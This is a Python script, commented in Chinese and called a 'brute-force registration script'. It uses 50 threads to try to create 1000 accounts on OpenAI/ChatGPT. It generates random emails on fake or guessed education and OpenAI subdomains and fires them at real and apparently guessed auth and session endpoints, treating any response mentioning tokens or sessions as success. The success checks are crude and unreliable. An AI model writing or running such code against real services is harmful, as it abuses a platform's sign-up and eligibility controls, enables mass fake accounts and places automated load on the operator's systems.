#!/usr/bin/env python3
"""
暴力注册脚本
- 没有代理也直接跑
- 自动测试各种教育邮箱域名
- 并发 50 个线程
"""

import requests
import random
import string
import time
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

# 输出
OUTPUT = Path(__file__).parent / "results"
OUTPUT.mkdir(exist_ok=True)
SUCCESS_FILE = OUTPUT / "success.txt"
FAILED_FILE = OUTPUT / "failed.txt"

# 教育邮箱域名库（扩展版）
EDU_DOMAINS = [
    # 原有域名
    "gpt.edu.sixoner.com",
    "student.edu.sixoner.com",
    "team.edu.sixoner.com",
    
    # 常见教育模式
    "edu.openai.com",
    "student.openai.com",
    "team.openai.com",
    "workspace.openai.com",
    "enterprise.openai.com",
    
    # 组合域名
    "chatgpt.edu",
    "gpt.school",
    "ai.university",
    "student.ai",
    "edu.gpt",
    "team.gpt",
    
    # 虚拟域名
    "temp.edu",
    "fake.edu",
    "test.edu",
    "demo.edu",
    "trial.edu",
    
    # 可能的 SSO 域名
    "sso.openai.com",
    "auth.openai.com",
    "login.openai.com",
    "signin.openai.com",
    
    # 随机生成
    "mail.edu",
    "email.edu",
    "corp.edu",
    "business.edu",
]

ss = set()

def generate_email(domain):
    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
    return f"{name}@{domain}"

def try_register(email):
    """直接尝试注册"""
    session = requests.Session()
    session.headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': '*/*',
    }
    
    # 尝试所有可能的端点
    endpoints = [
        # ChatGPT API
        ("POST", "https://chatgpt.com/api/auth/session", {"email": email}),
        ("POST", "https://chatgpt.com/backend-api/me", {}),
        
        # OpenAI Auth
        ("POST", "https://auth.openai.com/authorize", {"email": email}),
        ("GET", f"https://auth.openai.com/authorize?response_type=code&client_id=TdJIcbe16WoTHtN95nyywhwE5y7u9VbR&scope=openid%20email&redirect_uri=https%3A%2F%2Fchatgpt.com%2Fapi%2Fauth%2Fcallback%2Fsignin&state={random.choices(string.ascii_letters, k=16)}", {}),
        
        # SSO endpoints
        ("POST", "https://auth.openai.com/u/login/password", {"username": email}),
        ("POST", "https://auth.openai.com/u/login", {"username": email}),
        
        # Alternative
        ("POST", "https://chat.openai.com/api/auth/session", {"email": email}),
        ("GET", f"https://chatgpt.com/api/auth/login?email={email}", {}),
    ]
    
    for method, url, data in endpoints:
        try:
            if method == "POST":
                r = session.post(url, json=data, timeout=10, allow_redirects=False)
            else:
                r = session.get(url, timeout=10, allow_redirects=True)
            
            # 检查响应
            if r.status_code == 200:
                try:
                    result = r.json()
                    if 'token' in str(result) or 'session' in str(result) or 'user' in str(result):
                        return True, f"SUCCESS: {url} -> {r.status_code}", result
                except:
                    if 'token' in r.text.lower() or 'success' in r.text.lower():
                        return True, f"SUCCESS: {url} -> {r.status_code}", r.text[:500]
            
            elif r.status_code in (301, 302, 303, 307, 308):
                location = r.headers.get('Location', '')
                if 'callback' in location or 'token' in location or 'success' in location:
                    return True, f"REDIRECT: {location}", location
            
        except:
            pass
    
    return False, "FAILED", None

def worker(idx, total):
    domain = random.choice(EDU_DOMAINS)
    email = generate_email(domain)
    
    print(f"[{idx}/{total}] 尝试: {email}")
    
    ok, reason, data = try_register(email)
    
    if ok:
        print(f"  ✅ 成功！{reason}")
        with open(SUCCESS_FILE, 'a') as f:
            f.write(f"{email}|{reason}|{json.dumps(data)[:200]}\n")
        return True
    else:
        with open(FAILED_FILE, 'a') as f:
            f.write(f"{email}\n")
        return False

def main():
    print("="*60)
    print("暴力注册模式启动")
    print("目标: 1000 个账号")
    print("并发: 50 线程")
    print("="*60)
    
    success = 0
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = [executor.submit(worker, i, 1000) for i in range(1, 1001)]
        
        for f in as_completed(futures):
            if f.result():
                success += 1
    
    print(f"\n完成！成功: {success}/1000")

if __name__ == "__main__":
    main()
